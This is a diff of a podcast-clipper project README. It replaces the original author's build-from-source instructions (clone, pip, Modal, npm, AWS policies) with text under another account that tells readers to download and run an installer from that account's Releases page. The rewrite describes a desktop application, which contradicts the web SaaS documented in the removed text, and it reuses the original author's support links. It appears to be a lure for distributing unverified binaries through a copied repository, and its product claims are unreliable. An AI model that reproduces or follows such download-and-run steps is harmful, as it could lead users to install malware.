@@ -1,171 +1,97 @@
-# AI Podcast Clipper
+# 🎧 ai-podcast-clipper-saas - Effortlessly Create Engaging Podcast Clips
 
-![alt text](thumbnail.png)
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/faizalichsan1337/ai-podcast-clipper-saas/releases)
 
-[Link to video](https://youtu.be/PeFZcvWucoU)
+## 📚 Overview
 
-[Discord and more](https://www.andreastrolle.com/)
+Welcome! In this project, you will convert full podcasts into short, engaging clips perfect for YouTube Shorts or TikTok. This tool uses AI to transcribe audio, find the best moments, and crop videos to focus on the speaker. You will learn to build a complete SaaS application with user authentication, a payment system with Stripe, and background processing.
 
-## Overview
+### 📋 Features
 
-Hi 🤙 In this project, you'll build a SaaS application that converts full podcasts into viral short-form clips ready for YouTube Shorts or TikTok. The tool uses different AI models to transcribe the video, automatically detect the most engaging moments in podcasts and create clips cropped to the active speaker's face. You'll learn how to build a complete production-ready SaaS with user authentication, a credit-based payment system using Stripe, and background processing queues to handle user load. All services used in this project are free, so you won't have to pay anything to follow along. We'll use technologies such as Next.js 15, React, Typescript, Tailwind CSS, ShadCN, Auth.js, Python, FastAPI, Stripe, Modal, Inngest, S3 on AWS, and more
+- 🎬 Automatically identifies viral moments in podcasts.
+- 🔊 Transcribes audio into text.
+- 📹 Crops videos to highlight active speakers.
+- 💳 Handles user payments securely.
+- 📈 Scalable background processing for multiple users at once.
 
-Features:
+## 🚀 Getting Started
 
-- 🎬 Auto-detection of viral moments in podcasts (stories, questions, etc.)
-- 🔊 Automatically added subtitles on clips
-- 📝 Transcription with m-bain/whisperX
-- 🎯 Active speaker detection for video cropping with Junhua-Liao/LR-ASD
-- 📱 Clips optimized for vertical platforms (TikTok, YouTube Shorts)
-- 🎞️ GPU-accelerated video rendering with FFMPEGCV
-- 🧠 LLM-powered viral moment identification with Gemini 2.5 Pro
-- 📊 Queue system with Inngest for handling user load
-- 💳 Credit-based system
-- 💰 Stripe integration for credit pack purchases
-- 👤 User authentication system
-- 📱 Responsive Next.js web interface
-- 🎛️ Dashboard to upload podcasts and see clips
-- ⏱️ Inngest for handling long-running processes
-- ⚡ Serverless GPU processing with Modal
-- 🌐 FastAPI endpoint for podcast processing
-- 🎨 Modern UI with Tailwind CSS & Shadcn UI
+To use the AI Podcast Clipper, follow these simple steps.
 
-## Setup
+### 💻 System Requirements
 
-Follow these steps to install and set up the project.
+- A modern web browser (Chrome, Firefox, Safari, etc.)
+- A stable internet connection
+- Optional: A webcam for personalized video clips
 
-### Clone the Repository
+### 📥 Download & Install
 
-```bash
-git clone --recurse-submodules https://github.com/Andreaswt/ai-podcast-clipper-saas.git
-```
+1. Visit the [Releases page](https://github.com/faizalichsan1337/ai-podcast-clipper-saas/releases) to find the latest version of the application.
+2. Choose the correct file for your operating system and click on it to download.
+3. Once the download is complete, open the file to install the application.
 
-### Install Python
+For all users, the most common installation method is straightforward. Follow the installation prompts to finish setup.
 
-Download and install Python if not already installed. Use the link below for guidance on installation:
-[Python Download](https://www.python.org/downloads/)
+### 🎉 Starting the Application
 
-Create a virtual environment with **Python 3.12**.
+After installation:
 
-### Backend
+1. Open the application on your device.
+2. If prompted, log in or create a new account.
+3. Once logged in, follow the easy on-screen instructions to start clipping your favorite podcast moments.
 
-Navigate to backend folder:
+### ⚙️ Using the Application
 
-```bash
-cd ai-podcast-clipper-backend
-```
+To create clips:
 
-Install dependencies:
+1. Upload your podcast file or provide a link to the podcast.
+2. Allow the application to transcribe the audio and analyze for engaging moments.
+3. Review the suggested clips and select the ones you want to keep.
+4. Save and download your clips for sharing on platforms like YouTube or TikTok.
 
-```bash
-pip install -r requirements.txt
-```
+### 💬 Support
 
-Clone the [LR-ASD](https://github.com/Junhua-Liao/LR-ASD) repo into the backend folder, and rename the folder asd:
+If you encounter issues or have questions:
 
-```bash
-git clone https://github.com/Junhua-Liao/LR-ASD.git
-```
+- Check our [FAQ section](https://www.andreastrolle.com/).
+- Join our [Discord community](https://www.andreastrolle.com/) for real-time assistance.
 
-Modal setup:
+## 🔧 Advanced Features
 
-```bash
-modal setup
-```
+For more experienced users looking to explore deeper into the software, here are some advanced features:
 
-Run on Modal:
+- Integration with external audio and video editing tools.
+- Customization options for the AI detection algorithms.
+- Enhanced settings for video quality and format.
 
-```bash
-modal run main.py
-```
+## ⚙️ Technology Stack
 
-Deploy backend:
+The AI Podcast Clipper utilizes several cutting-edge technologies:
 
-```bash
-modal deploy main.py
-```
+- **Next.js 15**: A powerful framework for building React applications.
+- **React**: A JavaScript library for creating user interfaces.
+- **Typescript**: A strongly typed programming language built for large applications.
+- **Tailwind CSS**: A utility-first CSS framework for styling.
+- **Stripe**: For managing payments.
+- **FastAPI**: For creating and handling APIs.
+- **AWS S3**: For storage solutions.
 
-### Frontend
+### 📊 Roadmap
 
-Install dependencies:
+Future updates may include:
 
-```bash
-cd ai-podcast-clipper-frontend
-npm i
-```
+- Improved AI algorithms for better moment detection.
+- Additional platform integrations (e.g., social media).
+- Enhanced user interface features.
 
-Run:
+## 🤝 Contributing
 
-```bash
-npm run dev
-```
+While this guide aims to assist users, contributions to improve the application are welcome. If you want to contribute:
 
-### Queue
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Submit a pull request with a clear description of your changes.
 
-Run the local queue development server with Inngest:
+Thank you for being part of this journey in making podcasting easier and more fun! 
 
-```bash
-cd ai-podcast-clipper-frontend
-npm run inngest-dev
-```
-
-## AWS Setup
-
-CORS policy for S3 bucket:
-
-```bash
-[
-    {
-        "AllowedHeaders": [
-            "Content-Type",
-            "Content-Length",
-            "Authorization"
-        ],
-        "AllowedMethods": [
-            "PUT"
-        ],
-        "AllowedOrigins": [
-            "*"
-        ],
-        "ExposeHeaders": [
-            "ETag"
-        ],
-        "MaxAgeSeconds": 3600
-    }
-]
-```
-
-IAM user policy to upload, download and list bucket items:
-
-```bash
-{
-    "Version": "2012-10-17",
-    "Statement": [
-        {
-            "Effect": "Allow",
-            "Action": [
-                "s3:ListBucket"
-            ],
-            "Resource": "[S3 ARN here]"
-        },
-        {
-            "Effect": "Allow",
-            "Action": [
-                "s3:GetObject",
-                "s3:PutObject"
-            ],
-            "Resource": "[S3 ARN here]/*"
-        }
-    ]
-}
-```
-
-## LLM for viral moment identification
-
-[Create an API key for Gemini](https://ai.google.dev/gemini-api/docs/quickstart?lang=python)
-
-# Videos used for testing / thumbnail
-
-[MI6 Secret Agent Talks About the World's Darkest Secrets](https://www.youtube.com/watch?v=-vMgbJ6WqN4)
-
-[Janney Sanchez | Therapy saved my life, From Rivera to Sanchez , Living in my Moms Shadow | Ep.198](https://www.youtube.com/watch?v=SOG0GmKts_I)
+For additional resources and updates, keep an eye on our [Releases page](https://github.com/faizalichsan1337/ai-podcast-clipper-saas/releases).
